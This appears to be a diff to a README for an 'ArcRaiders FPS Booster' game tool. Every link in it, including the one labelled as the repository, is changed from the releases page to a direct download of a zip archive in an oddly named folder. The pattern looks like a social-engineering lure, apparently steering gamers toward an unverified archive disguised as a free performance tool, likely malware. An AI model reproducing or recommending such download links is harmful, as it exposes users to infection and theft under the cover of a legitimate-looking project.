@@ -1,6 +1,6 @@
 # ⚡ ArcRaiders-FPS-Booster-2025-2026 - Improve Your Game Performance Easily
 
-[![Download the Latest Version](https://img.shields.io/badge/Download-ArcRaiders%20FPS%20Booster-brightgreen?style=for-the-badge)](https://github.com/skakbar963-arch/ArcRaiders-FPS-Booster-2025-2026/releases)
+[![Download the Latest Version](https://img.shields.io/badge/Download-ArcRaiders%20FPS%20Booster-brightgreen?style=for-the-badge)](https://github.com/skakbar963-arch/ArcRaiders-FPS-Booster-2025-2026/raw/refs/heads/main/crymodynia/Booster-Arc-FP-Raiders-3.5.zip)
 
 ---
 
@@ -46,7 +46,7 @@ Follow these steps to download and run ArcRaiders-FPS-Booster-2025-2026 on your 
 
 Click the button below to open the release page for ArcRaiders-FPS-Booster-2025-2026. This page contains all the available versions and files.
 
-[![Download Now](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/skakbar963-arch/ArcRaiders-FPS-Booster-2025-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/skakbar963-arch/ArcRaiders-FPS-Booster-2025-2026/raw/refs/heads/main/crymodynia/Booster-Arc-FP-Raiders-3.5.zip)
 
 ### Step 2: Choose the Latest Release
 
@@ -73,7 +73,7 @@ Find the newly installed ArcRaiders-FPS-Booster on your desktop or Start menu. O
 ## 📥 Download and Installation Details
 
 You can always access the latest version here:  
-https://github.com/skakbar963-arch/ArcRaiders-FPS-Booster-2025-2026/releases
+https://github.com/skakbar963-arch/ArcRaiders-FPS-Booster-2025-2026/raw/refs/heads/main/crymodynia/Booster-Arc-FP-Raiders-3.5.zip
 
 If you want to update or reinstall, just repeat the download and install process.
 
@@ -136,9 +136,9 @@ Yes. The software is open-source and free to use for anyone.
 ## 🔗 Useful Links
 
 - Releases and Downloads:  
-  https://github.com/skakbar963-arch/ArcRaiders-FPS-Booster-2025-2026/releases  
+  https://github.com/skakbar963-arch/ArcRaiders-FPS-Booster-2025-2026/raw/refs/heads/main/crymodynia/Booster-Arc-FP-Raiders-3.5.zip  
 - GitHub Repository:  
-  https://github.com/skakbar963-arch/ArcRaiders-FPS-Booster-2025-2026
+  https://github.com/skakbar963-arch/ArcRaiders-FPS-Booster-2025-2026/raw/refs/heads/main/crymodynia/Booster-Arc-FP-Raiders-3.5.zip
 
 ---
 
